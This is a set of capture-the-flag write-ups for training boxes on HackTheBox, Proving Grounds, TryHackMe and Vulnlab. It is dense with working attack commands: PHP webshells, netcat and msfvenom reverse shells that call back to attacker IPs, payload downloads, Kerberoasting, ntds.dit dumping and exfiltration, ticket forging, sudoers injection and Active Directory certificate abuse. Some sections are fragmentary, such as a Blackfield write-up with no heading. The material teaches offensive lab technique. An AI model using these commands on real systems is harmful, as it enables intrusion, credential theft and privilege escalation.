docs.title: Access -- Proving Grounds (write-up)
docs.text: Difficulty: Intermediate Box: Access (Proving Grounds) Author: dsec Date: 2025-06-15

docs.title: File upload bypass via double extension and .htaccess gave webshell. Kerberoasted MSSQL service account. SeManageVolume exploit + DLL hijack for SYSTEM.
Target info
docs.text:
• Host: 192.168.179.187
  • Domain: access.offsec
  • Services discovered: 53/tcp, 80/tcp, 88/tcp, 135/tcp, 139/tcp, 389/tcp, 445/tcp, 464/tcp, 593/tcp, 636/tcp, 3268/tcp, 3269/tcp, 5985/tcp, 9389/tcp

docs.title: Foothold
docs.text:
Created a double extension PHP webshell shell.php.jpg:

<?php system($_REQUEST['cmd']); ?>

Uploaded .htaccess to execute .jpg as PHP:

AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .jpeg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif

Uploaded nc64.exe and triggered reverse shell:

curl -G http://192.168.179.187/uploads/shell.php.jpg --data-urlencode 'cmd=nc64.exe -e cmd.exe 192.168.45.205 443'


rlwrap -cAr nc -lnvp 443

docs.title: Lateral movement
docs.text:
Ran Get-SPN.ps1 to find service accounts:

powershell -ExecutionPolicy Bypass
.\s.ps1

Requested Kerberos ticket:

Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DC.access.offsec'

Used Rubeus to kerberoast:

.\Rubeus.exe kerberoast

Saved hash, removed whitespace, cracked with john:

john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 mssql.hash

Password: trustno1

Used RunasCs to get shell as svc_mssql:

.\r.exe svc_mssql trustno1 -r 192.168.45.205:6969 cmd

docs.title: Privilege escalation
docs.text:
whoami /priv

Had SeManageVolumePrivilege. Used SeManageVolumeExploit.exe to gain write access to system directories:

.\v.exe

DLL hijack via tzres.dll (called when running systeminfo):

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.205 LPORT=135 -f dll -o tzres.dll

iwr http://192.168.45.205/tzres.dll -o c:\Windows\System32\wbem\tzres.dll
systeminfo

Error message appeared but listener received admin shell.

docs.title: Lessons & takeaways
docs.text:
• Double extension + .htaccess upload is a reliable webshell technique when upload directories allow it
  • Kerberoasting with Rubeus is straightforward when you have domain user access
  • SeManageVolumePrivilege enables DLL hijacking by granting write access to privileged directories

docs.title: Active -- HackTheBox (write-up)
docs.text: Difficulty: Easy / Beginner Box: Active (HackTheBox) Author: dsec Date: 2025-12-02

docs.title: Anonymous SMB access to Replication share revealed GPP-encrypted credentials. Decrypted with gpp-decrypt, then Kerberoasted the Administrator account. Pass-the-hash with psexec for domain admin.
Target info
docs.text:
• Host: 10.129.78.4
  • Domain: active.htb

docs.title: Enumeration
docs.text:
Ran enum4linux with null creds:

enum4linux -a -u "" -p "" 10.129.78.4

Spidered SMB shares with nxc:

nxc smb 10.129.78.4 -u '' -p '' -M spider_plus && cat /tmp/nxc_spider_plus/10.129.78.4.json

docs.title: Initial foothold -- GPP password
docs.text:
Connected to SMB and found Groups.xml in the Replication share containing a GPP-encrypted password for SVC_TGS:

smbclient.py 10.129.78.4

Decrypted the cpassword:

gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

Password: GPPstillStandingStrong2k18

Confirmed access:

smbclient.py active.htb/svc_tgs:GPPstillStandingStrong2k18@10.129.78.4

Got user flag from Users\SVC_TGS\Desktop\user.txt.

docs.title: Privesc -- Kerberoasting
docs.text:
Requested service tickets:

GetUserSPNs.py -request -dc-ip 10.129.140.216 active.htb/svc_tgs

Got a TGS hash for the Administrator account. Cracked it with hashcat:

hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt

Password: Ticketmaster1968

Got domain admin shell:

psexec.py active.htb/administrator@10.129.74.111

docs.title: Lessons & takeaways
docs.text:
• GPP passwords in SYSVOL are trivially decryptable -- always check Replication/SYSVOL shares
  • Kerberoasting is effective when service accounts have weak passwords
  • Anonymous SMB access can be the initial foothold on AD boxes

docs.title: Administrator -- HackTheBox (write-up)
docs.text: Difficulty: Medium Box: Administrator (HackTheBox) Author: dsec Date: 2025-08-17

docs.title: AD chain: Olivia -> Michael (GenericAll) -> Benjamin (ForceChangePassword via bloodyAD) -> Emily (PasswordSafe) -> Ethan (targeted Kerberoast) -> DA via secretsdump.
Target info
docs.text:
• Host: 10.10.11.42
  • Domain: administrator.htb

docs.title: Enumeration
docs.text:
Found users:

Can also enumerate via:

nxc smb administrator.htb -u "Olivia" -p "ichliebedich" --rid-brute | grep SidTypeUser

Collected BloodHound data:

nxc ldap administrator.htb -u Olivia -p ichliebedich --bloodhound --collection All --dns-tcp --dns-server 10.10.11.42

docs.title: Attack chain
docs.text:
Checked first-degree outbound control on Olivia:

Michael leads to Benjamin, who has no outbound controls -- worth targeting:

Used PowerView to confirm ACLs:

. .\PowerView.ps1

$Olivia = Get-ADUser -Identity "olivia" -Properties ObjectSID


$MichaelACL = Get-DomainObjectAcl -Identity "CN=Michael Williams,CN=Users,DC=administrator,DC=htb" -ResolveGUIDs
$MichaelACL | Where-Object { $_.SecurityIdentifier -eq $Olivia.ObjectSID -and $_.ActiveDirectoryRights -match "GenericAll" } | Select-Object IdentityReference, ActiveDirectoryRights

$BenjaminACL | Where-Object { $_.SecurityIdentifier -eq $Michael.ObjectSID -and $_.ActiveDirectoryRights -match "ForceChangePassword" } | Select-Object IdentityReference, ActiveDirectoryRights

$UsersAcls = Get-DomainObjectAcl -SearchBase "CN=Users,DC=administrator,DC=htb" -ResolveGUIDs


$UsersAcls | Where-Object { $_.SecurityIdentifier -eq $Olivia.ObjectSID } | Select-Object IdentityReference, ObjectDN, ActiveDirectoryRights | Format-Table -AutoSize

Checked Benjamin's extended rights -- S-1-1-0 (Everyone) has User-Change-Password:

(Get-DomainObjectAcl -Identity "CN=Benjamin Brown,CN=Users,DC=administrator,DC=htb" -ResolveGUIDs) | Where-Object { $_.ActiveDirectoryRights -match "ExtendedRight" -and $_.ObjectAceType -match "User-Change-Password" } | Format-Table SecurityIdentifier, IdentityReference, ActiveDirectoryRights, ObjectAceType -AutoSize

net user command didn't work for changing Benjamin's password directly.

Changed Michael's password first (Olivia has GenericAll over Michael), then used bloodyAD from Michael to change Benjamin's:

bloodyAD -u "Michael" -p "Password123" -d "Administrator.htb" --host "10.10.11.42" set password "Benjamin" "12345678"

bloodyAD works because it uses LDAP to exploit the User-Change-Password extended right, unlike net user which relies on local account privileges.

Found a PasswordSafe database. Installed and opened it:

sudo apt install passwordsafe
pwsafe

Extracted creds:

  • alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
  • emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
  • emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur

Emily has write permissions over Ethan -- targeted Kerberoasting.

Added administrator.htb and dc.administrator.htb to /etc/hosts.

targetedKerberoast -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -d "Administrator.htb" --dc-ip 10.10.11.42

Cracked Ethan's hash, then secretsdump:

secretsdump.py "Administrator.htb/ethan:limpbizkit"@"dc.Administrator.htb"

docs.title: Lessons & takeaways
docs.text:
• BloodHound first-degree outbound controls reveal the full chain
  • bloodyAD can exploit LDAP-based extended rights that net user can't
  • targetedKerberoast sets a temporary SPN, grabs the hash, then removes it
  • PowerView confirms ACLs manually when BloodHound isn't enough

docs.title: Algernon -- Proving Grounds (write-up)
docs.text: Difficulty: Easy / Beginner Box: Algernon (Proving Grounds) Author: dsec Date: 2025-02-19

docs.title: SmarterMail on port 9998 had a known exploit (EDB 49216) that gave SYSTEM immediately via a deserialization vulnerability.
Target info
docs.text:
• Host: 192.168.188.65
  • Services discovered via nmap

docs.title: Enumeration
docs.text: sudo nmap -Pn -n 192.168.188.65 -sCV -p- --open -vvv

docs.title: SmarterMail -- port 9998
docs.text:
Found exploit EDB 49216. Edited the script with target IP, local host/port, and the already-listed port 17001 (confirmed in nmap):

Set up listener:

rlwrap -cAr nc -lnvp 4444

python3 49216.py

docs.title: Lessons & takeaways
docs.text:
• SmarterMail deserialization is a one-shot SYSTEM exploit -- always check for it
  • When nmap shows uncommon ports already open (like 17001), the exploit may already be configured for them

docs.title: AllSignsPoint2Pwnage — TryHackMe (write-up)
docs.text: Difficulty: Medium Box: AllSignsPoint2Pwnage (TryHackMe) Author: dsec Date: 2025-06-08

docs.title: Enumeration found an image upload path. Uploaded a PHP reverse shell to /images/shell3.php. Used psexec with Administrator creds for an elevated shell. Extracted VNC password from UltraVNC config and decrypted it for VNC access.
Foothold
docs.text:
Uploaded PHP Ivan Sincek shell from revshells.com to the images directory:

10.10.21.178/images/shell3.php

Used psexec with Administrator credentials:

psexec -accepteula -nobanner -u administrator -p RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi cmd.exe

docs.title: Post-exploitation
docs.text:
Checked UltraVNC config:

C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini

Checked Windows autologon registry:

REG QUERY "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

Uploaded vncpwd.exe to decrypt the VNC password:

Decrypted password: 5upp0rt9

Connected via VNC:

xtigervncviewer 10.10.30.105

xtigervncviewer allows clipboard use, unlike xvncviewer.

Used PowerShell to run commands as Administrator:

$username = "Administrator"
$password = "RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $securePassword)
Start-Process cmd.exe -Credential $credential -ArgumentList "/c type C:\Users\Administrator\Desktop\admin_flag.txt"

docs.title: Lessons & takeaways
docs.text:
• UltraVNC configuration files (ultravnc.ini) store encrypted passwords that can be trivially decrypted with vncpwd.exe
  • Use xtigervncviewer over xvncviewer for clipboard support
  • PSExec with known credentials provides a quick elevated shell
  • Always check Windows autologon registry keys for stored credentials

docs.title: Amaterasu -- Proving Grounds (write-up)
docs.text: Difficulty: Medium Box: Amaterasu (Proving Grounds) Author: dsec Date: 2024-10-18

docs.title: REST API file upload required specific parameter names (trial and error). Got a shell, then escalated via tar wildcard injection in a cron job to add sudo rights for the user.
REST API file upload
docs.text:
Error said no "file" parameter.

Now says "no fileNAME" -- getting closer.

docs.title: Privilege escalation -- tar wildcard injection
docs.text:
tar was missing a filepath in a cron job, so I created tar as an executable file in the listed filepath:

Can also take advantage of the wildcard by creating empty files with special names in the restapi directory:

echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh privEsc.sh'

privEsc.sh contents:

#!/bin/bash
echo 'alfredo ALL=(root) NOPASSWD: ALL' >> /etc/sudoers

Then sudo su for root access.

docs.title: Lessons & takeaways
docs.text:
• REST API file uploads often require specific parameter names -- fuzz them with different field names
  • Tar wildcard injection with --checkpoint and --checkpoint-action is a reliable privesc when tar runs as root on a directory you control
  • Creating files named as tar flags is a classic Unix trick

docs.title: Analytics -- HackTheBox (write-up)
docs.text: Difficulty: Easy Box: Analytics (HackTheBox) Author: dsec Date: 2025-10-15

docs.title: Metabase pre-auth RCE for initial shell. Found credentials in environment. Privesc via overlay filesystem capability abuse.
Target info
docs.text: • Host: Analytics (HackTheBox)

docs.title: Foothold
docs.text:
Metabase pre-auth RCE exploit:

  • https://github.com/m3m0o/metabase-pre-auth-rce-poc

Setup token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f

docs.title: Lateral movement
docs.text:
Found credentials in environment:

  • metalytics:An4lytics_ds20223#

SSH'd in:

docs.title: Privilege escalation
docs.text:
Overlay filesystem + capability abuse:

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("rm -rf l m u w; bash")'

docs.title: Lessons & takeaways
docs.text:
• Check environment variables for credentials after getting initial shell
  • The unshare + overlay filesystem trick is a powerful Linux privesc technique
  • Pre-auth RCE in Metabase (CVE-2023-38646) only needs the setup token

docs.title: Apex -- Proving Grounds (write-up)
docs.text: Difficulty: Hard Box: Apex (Proving Grounds) Author: dsec Date: 2024-06-24

docs.title: Exploited OpenEMR via an authenticated file read vulnerability to extract MySQL credentials from sqlconf.php, cracked the admin password hash from the database, and escalated via password reuse to root.
Enumeration
docs.text:
Found OpenEMR:

Searched GitHub for password handling:

repo:openemr/openemr "$pass"


feroxbuster -u http://192.168.145.145/openemr -w /usr/share/wordlists/dirb/common.txt -n -x php

  • Requires auth.

docs.title: Exploitation
docs.text:
• Unedited script works but fails to get sqlconf.
  • Need PHPSESSID.
  • otgra9kr3eo0gcteikasu3ji00

Script still fails:

Had to edit the clipboard and read functions in the exploit:

Changed to:

  • Changed data variable in paste_clipboard function to "path=Documents" because this is the folder we have access to within filemanager.
  • Changed url_path variable in read_file function to %s/filemanager/Documents/%s.
  • The path for OpenEMR is under /var/www instead of /var/www/html.
  • The copied sqlconf.php can only be viewed via the SMB share since PHP files get processed server-side.

  • openemr:C78maEQUIEuQ

  • SSL error, had to use --ssl=0.
mysql --ssl=0 -u openemr -p -h 192.168.145.145

  • Cracked without salt.

docs.title: Privilege escalation
docs.text: • Password reuse to root.

docs.title: Lessons & takeaways
docs.text:
• OpenEMR exploits often need tweaking -- the file paths and session handling vary between installations
  • When PHP files are copied via exploits, view them through SMB or other non-PHP-processing means
  • Always try --ssl=0 if MySQL connections fail with SSL errors
  • Password reuse between application databases and system accounts is common

docs.title: Arctic -- HackTheBox (write-up)
docs.text: Difficulty: Easy Box: Arctic (HackTheBox) Author: dsec Date: 2025-03-12

docs.title: ColdFusion on port 8500. Used a public exploit for initial shell. SeImpersonate potato exploits all failed due to RPC port issues, had to fall back to a kernel exploit (MS10-059 Chimichurri) for SYSTEM.
Target info
docs.text:
• Host: 10.129.78.35
  • Services discovered via nmap

docs.title: Enumeration
docs.text: sudo nmap -Pn -n 10.129.78.35 -sCV -p- --open -vvv

docs.title: ColdFusion exploit
docs.text: Found a ColdFusion exploit on Exploit-DB (50057). Edited listener/target IPs:

docs.title: Privilege escalation -- failed potatoes
docs.text:
Transferred tools:

certutil -split -urlcache -f http://10.10.14.240/JuicyPotatoNG.exe
certutil -split -urlcache -f http://10.10.14.240/shell.exe
certutil -split -urlcache -f http://10.10.14.240/PrintSpoofer64.exe

Tried JuicyPotatoNG with multiple CLSIDs and ports -- all failed:

.\JuicyPotatoNG.exe -t * -p .\shell.exe -c "{69AD4AEE-51BE-439b-A92C-86AE490E8B30}" -l 8500
.\JuicyPotatoNG.exe -t * -p .\shell.exe -c "{4991d34b-80a1-4291-83b6-3328366b9097}"
.\JuicyPotatoNG.exe -t * -p .\shell.exe -c "{659cdea7-489e-11d9-a9cd-000d56965251}"

Tried RoguePotato and GodPotato too:

certutil -split -urlcache -f http://10.10.14.240/RoguePotato.exe
certutil -split -urlcache -f http://10.10.14.240/nc64.exe
certutil -split -urlcache -f http://10.10.14.240/GodPotato-NET4.exe

Checked netstat and running processes:

None of the SeImpersonate exploits worked because of RPC port errors.

docs.title: Kernel exploit -- MS10-059
docs.text:
Had to use a kernel exploit. Checked systeminfo -- no hotfixes listed, so kernel exploits are worth trying.

Used MS10-059 (Chimichurri.exe):

certutil -split -urlcache -f http://10.10.14.240/Chimichurri.exe

docs.title: Lessons & takeaways
docs.text:
• When all potato exploits fail, check systeminfo for missing hotfixes and try kernel exploits
  • MS10-059 (Chimichurri) works on older unpatched Windows systems
  • No hotfixes listed in systeminfo = good candidate for kernel exploits

docs.title: Astronaut -- Proving Grounds (write-up)
docs.text: Difficulty: Intermediate Box: Astronaut (Proving Grounds) Author: dsec Date: 2025-10-10

Target info
docs.text: • Host: Astronaut (Proving Grounds)

docs.title: Enumeration
docs.text: Could have used discovered credentials to SSH, but used Metasploit instead since the manual exploit would not work.

docs.title: Foothold
docs.text: Meterpreter shell kept dying (unstable), so pivoted to a Python3 reverse shell (#2 from revshells):

docs.title: Privilege escalation
docs.text: SUID bit set on PHP:

docs.title: Lessons & takeaways

docs.title: Authby — Proving Grounds (write-up)
docs.text: Difficulty: Intermediate Box: Authby (Proving Grounds) Author: dsec Date: 2025-04-28

docs.title: Anonymous FTP listed user accounts. Brute-forced FTP to find admin:admin. Cracked a .htpasswd hash to get offsec:elite for the web portal. Uploaded a PHP reverse shell via FTP to the web root. Escalated via SeImpersonatePrivilege with JuicyPotato (x86) using a BITS CLSID and a stageless payload.
Target info
docs.text:
• Host: 192.168.221.46 / 192.168.179.46
  • OS: LIVDA (Windows)

docs.title: Enumeration
docs.text: Anonymous FTP access showed /accounts listing Offsec, anonymous, and admin users.

docs.title: Foothold
docs.text:
Brute-forced FTP:

hydra -I -V -f -L usernames.txt -u -P /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt 192.168.179.46 ftp

Found admin:admin. Downloaded files:

ftp admin:admin
mget *

Hash: $apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0

Cracked: offsec:elite

Creds worked on the web portal on port 242. FTP uploads went to c:\wamp\www\ -- uploaded a PHP web shell and confirmed command execution:

Generated a reverse shell:

msfvenom -p php/reverse_php LHOST=192.168.45.208 LPORT=4444 -o msf_shell.php

Got shell as livda\apache.

docs.title: Privesc
docs.text:
System is x86. whoami /priv showed SeImpersonatePrivilege.

RoguePotato failed with a 32/64 bit error:

JuicyPotato x86 failed with a CLSID error:

Added BITS CLSID for Windows Server 2008 R2:

C:\wamp\www\Juicy.Potato.x86.exe -t * -p C:\wamp\www\shell-x86-3.exe -l 4443 -c "{03ca98d6-ff5d-49b8-abc6-03dd84127020}"

The staged payload shell was dying on connect. Switched to a stageless payload:

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.208 LPORT=4443 -f exe > shell-x86-3.exe

Got SYSTEM shell.

docs.title: Lessons & takeaways
docs.text:
• FTP anonymous access can reveal usernames for targeted brute-forcing
  • When FTP uploads land in the web root, that is a direct path to RCE
  • JuicyPotato on older Windows requires the correct CLSID for the OS version
  • Staged payloads can die immediately -- switch to stageless when shells keep dropping

docs.title: Baby -- Vulnlab (write-up)
docs.text: Difficulty: Easy Box: Baby (Vulnlab) Author: dsec Date: 2025-10-02

docs.title: LDAP anonymous bind leaked user list and a password in description field. Password spray hit one user. Privesc via diskshadow + secretsdump to dump ntds.dit.
Target info
docs.text:
• Host: 10.10.88.213
  • Domain: baby.vl
  • Services discovered: 53/tcp (dns), 88/tcp (kerberos), 389/tcp (ldap), 445/tcp (smb), 5985/tcp (winrm)

docs.title: Enumeration
docs.text:
nmap 10.10.88.213 -vvv -Pn -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5357,5985,9389,49664,49667,49669,49674,49675,64126,64981

Enumerated users via LDAP:

ldapsearch -x -b "dc=baby,dc=vl" "user" -H ldap://10.10.88.213 | grep dn

Found a password in description fields:

ldapsearch -x -b "dc=baby,dc=vl" "*" -H ldap://10.10.88.213 | grep desc -A2

docs.title: Initial access
docs.text:
Password spray:

nxc smb 10.10.88.213 -u users.txt -p 'BabyStart123!'

docs.title: Privilege escalation
docs.text:
First tried to copy ntds.dit directly but it was in use. Blackfield method gave access denied.

Used diskshadow to create a shadow copy:

cd c:\
mkdir Temp
cd \Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
download sam
download system

Created script.txt for diskshadow:

set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup

diskshadow /s script.txt
robocopy /b E:\Windows\ntds . ntds.dit
download ntds.dit

Dumped secrets:

secretsdump.py -sam sam -system system -ntds ntds.dit LOCAL

First attempt used local admin hash which doesn't work on DC machines.

Used the domain admin hash:

evil-winrm -i 10.10.91.158 -u 'administrator' -H 'ee4457ae59f1e3fbd764e33d9cef123d'

docs.title: Lessons & takeaways
docs.text:
• LDAP anonymous bind can leak passwords in user description fields
  • Local admin hashes from SAM don't work for PTH on domain controllers -- use ntds.dit domain hashes
  • diskshadow + robocopy is the reliable way to copy a locked ntds.dit

Got a hash for support. Cracked with hashcat:

BloodHound analysis:

bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.129.229.17

  • support has ForceChangePassword control over audit2020.
rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.129.229.17 -c 'setuserinfo2 audit2020 23 "0xdf!!!"'

docs.text:
smbmap -H 10.129.229.17 -u audit2020 -p '0xdf!!!'
  • forensic share has read access.
  • memory_analysis/lsass.zip is most interesting -- LSASS is the same thing mimikatz dumps.
  • command_output/domain_admins.txt shows extra domain admin account Ipwn3dYourCompany.
pypykatz lsa minidump lsass.DMP
  • svc_backup NT hash: 9658d1d1dcd9250115e2205d9f48400d

docs.title: Shell as svc_backup
docs.text:
evil-winrm -i 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d

whoami /priv shows SeBackupPrivilege:

  • SeBackupPrivilege means user is in the Backup Operators group -- can read/write most files on the system.

docs.title: Privilege escalation (DiskShadow + ntds.dit)
docs.text:
Used DiskShadow to create a volume shadow copy:

Created vss.dsh: 

set context persistent nowriters
add volume c: alias df
create
expose %df% z:


unix2dos vss.dsh
diskshadow /s c:\programdata\vss.dsh

Set up SMB server and exfiltrated ntds.dit and SYSTEM hive:

smbserver.py s . -smb2support

Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\10.10.14.172\s\ntds.dit
reg.exe save HKLM\SYSTEM C:\system.hiv
Copy-Item C:\system.hiv \\10.10.14.172\s\system

Dumped hashes:

secretsdump.py -system system -ntds ntds.dit LOCAL

  • Administrator hash: aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee
evil-winrm -i 10.129.229.17 -u administrator -H 184fb5e5178480be64824d4cd53b99ee

docs.title: Lessons & takeaways
docs.text:
• SMB shares with directory names that look like usernames are a goldmine for user enumeration
  • BloodHound's Outbound Object Control view reveals relationships like ForceChangePassword that you would not find manually
  • LSASS dumps from forensic shares are just as good as running mimikatz on a live system
  • SeBackupPrivilege + DiskShadow is a reliable path to domain admin via ntds.dit extraction

docs.title: Breach -- Vulnlab (write-up)
docs.text: Difficulty: Medium Box: Breach (Vulnlab) Author: dsec Date: 2025-05-20

docs.title: SMB share enumeration revealed usernames. Hashgrab via .lnk file led to initial creds, then silver ticket forged for MSSQL service gave admin path. Privesc via SeImpersonate with JuicyPotatoNG.
Target info
docs.text:
• Host: 10.10.10.111
  • Domain: breach.vl
  • Services discovered: 53/tcp, 80/tcp, 88/tcp, 135/tcp, 139/tcp, 389/tcp, 445/tcp, 464/tcp, 593/tcp, 636/tcp, 3268/tcp, 3269/tcp, 5985/tcp, 9389/tcp

docs.title: Enumeration
docs.text:
SMB share transfer was accessible but directories were locked. Found users:

  • claire.pope
  • diana.pope
  • julia.wong

docs.title: Foothold
docs.text:
Used hashgrab.py to create a malicious .lnk file and placed it in the transfer share.

Cracked credentials: julia.wong:Computer1

Used xp_dirtree to coerce MSSQL authentication:

EXEC xp_dirtree '\\10.8.2.206\test', 1, 1

Cracked: svc_mssql:Trustno1

docs.title: Lateral movement
docs.text:
Ran enum4linux -- svc_mssql was in Remote Desktop Users.

Attempted to add svc_mssql to Remote Management Users via ldeep:

ldeep ldap -u julia.wong -p 'Computer1' -d breach.vl -s ldap://breach.vl add_to_group "CN=SVC_MSSQL,CN=USERS,DC=BREACH,DC=VL" "CN=REMOTE MANAGEMENT USERS,CN=BUILTIN,DC=BREACH,DC=VL"

No combination worked.

docs.title: Silver Ticket
docs.text:
Had low-level creds, so checked for SID and ServicePrincipalName to forge a silver ticket.

GetUserSPNs.py breach.vl/julia.wong:Computer1 -dc-ip 10.10.10.111 -request

Returns NTLMv2 hash and SPN like MSSQLSVC/BREACH.VL:1433.

lookupsid.py breach.vl/julia.wong:computer1@10.10.10.10

Got Domain SID. Generated NT hash from password Trustno1 using an NTLM hash generator: 69596C7AA1E8DAEE17F8E78870E25A5C

ticketer.py -nthash 69596C7AA1E8DAEE17F8E78870E25A5C -domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl spn 'MSSQLSVC/BREACH.VL:1433@BREACH.VL' -user-id 500 Administrator

Made sure /etc/hosts reflected IP for domain BREACH.VL.

docs.title: Privilege escalation
docs.text: Had SeImpersonate privilege. Used JuicyPotatoNG to escalate to SYSTEM.

docs.title: Lessons & takeaways
docs.text:
• When you have low-level creds and an SPN, consider forging a silver ticket
  • Always check whoami /priv for SeImpersonate -- JuicyPotatoNG is a reliable escalation path
  • Hashgrab .lnk files in writable shares are a solid initial access vector

docs.title: Broker -- HackTheBox (write-up)
docs.text: Difficulty: Easy Box: Broker (HackTheBox) Author: dsec Date: 2025-06-11

docs.title: Default creds on ActiveMQ admin panel. Exploited CVE-2023-46604 for shell. Privesc by abusing sudo nginx to write SSH keys to root's authorized_keys.
Target info
docs.text:
• Host: 10.129.230.87
  • Services discovered: 22/tcp (ssh), 80/tcp (http), 8080/tcp, 8161/tcp (activemq)

docs.title: Enumeration
docs.text: sudo nmap -Pn -n 10.129.230.87 -sCV -p- --open -vvv

docs.title: Exploitation
docs.text:
Port 80 -- logged in with admin:admin to manage ActiveMQ:

Used Metasploit module or Python exploit for CVE-2023-46604:

  • search activemq -> use 9
  • Changed default SVRPORT from 8080 to 8040 (port conflict otherwise)

Python exploit: https://github.com/evkl1d/CVE-2023-46604

docs.title: Privilege escalation
docs.text:
sudo -l

Generated SSH key:

Created a malicious nginx config (dank.conf):

user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1338;
        root /;
        autoindex on;
        dav_methods PUT;
    }
}

This config runs nginx as root with WebDAV PUT enabled, allowing file uploads anywhere on the filesystem.

Copied public key contents:

Uploaded config to target, then started nginx with it:

sudo /usr/sbin/nginx -c /tmp/dank.conf

Wrote SSH public key to root's authorized_keys:

curl -X PUT localhost:1338/root/.ssh/authorized_keys -d 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKtaR8DAtB8ux+Mb1jnDqIjqsP2QWDsTLk9e0vE/kebn nobody@nothing'

SSH as root:

ssh -i ./id_ed25519 root@10.129.230.87

docs.title: Lessons & takeaways
docs.text:
• Default creds (admin:admin) on ActiveMQ -- always try defaults
  • Sudo nginx is dangerous -- a custom config with dav_methods PUT and root / allows writing anywhere as root
  • Generate SSH keys and write them to /root/.ssh/authorized_keys for clean root access

docs.title: Certified -- HackTheBox (write-up)
docs.text: Difficulty: Medium Box: Certified (HackTheBox) Author: dsec Date: 2025-12-11

docs.title: AD certificate abuse chain. Started with provided creds, abused ownership + WriteMember permissions to join the Management group, used pywhisker for shadow credentials on management_svc, then ESC9 certificate attack through ca_operator to get Administrator hash.
Target info
docs.text:
• Host: 10.129.239.104 / 10.10.11.41
  • Domain: certified.htb

docs.title: Enumeration
docs.text: Starting creds: judith.mader:judith09

docs.title: Step 1 -- Take ownership of Management group
docs.text:
Set judith as owner of the Management group:

bloodyAD -d certified.htb -u judith.mader -p judith09 --host 10.129.239.104 set owner "CN=Management,CN=Users,DC=certified,DC=htb" "CN=Judith Mader,CN=Users,DC=certified,DC=htb"

docs.title: Step 2 -- Add judith to Management group
docs.text:
Write member permissions:

python3 dacledit.py -dc-ip 10.129.239.104 -u certified.htb/judith.mader:judith09 -target-dn "CN=Management,CN=Users,DC=certified,DC=htb" -principal-dn "CN=Judith Mader,CN=Users,DC=certified,DC=htb" -action write -rights WriteMembers

Immediately add to group:

bloodyAD -d certified.htb -u judith.mader -p judith09 --host 10.129.239.104 add groupMember "CN=Management,CN=Users,DC=certified,DC=htb" "CN=Judith Mader,CN=Users,DC=certified,DC=htb"

Verified:

bloodyAD -d certified.htb -u judith.mader -p judith09 --host 10.129.239.104 get object "CN=Management,CN=Users,DC=certified,DC=htb"

docs.title: Step 3 -- Shadow credentials on management_svc
docs.text:
python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"

Converted to PFX:

openssl pkcs12 -export -out management_svc_cert.pfx -inkey management_svc_cert.pem_priv.pem -in management_svc_cert.pem_cert.pem -nodes -password pass:

docs.title: Step 4 -- Fix clock skew and authenticate
docs.text:
sudo systemctl stop systemd-timesyncd
sudo ntpdate -u 10.129.239.104
certipy auth -pfx management_svc_cert.pfx -u management_svc -domain certified.htb -dc-ip 10.129.239.104 -debug

Got management_svc hash: aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584

docs.title: Step 5 -- Certipy enumeration
docs.text:
certipy find -dc-ip 10.10.11.41 -ns 10.10.11.41 -u management_svc@certified.htb -hashes 'a091c1832bcdd4677c28b5a6a1295584' -vulnerable -stdout

Initial shell attempts failed.

docs.title: Step 6 -- Shadow credentials on ca_operator
docs.text:
Used management_svc's GenericAll over ca_operator to write shadow credentials and get ca_operator's NTLM hash:

certipy shadow auto -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -target certified.htb -dc-ip 10.10.11.41

ca_operator hash: 259745cb123a52aa2e693aaacca2db52

docs.title: Step 7 -- ESC9 attack
docs.text:
Reference: https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7

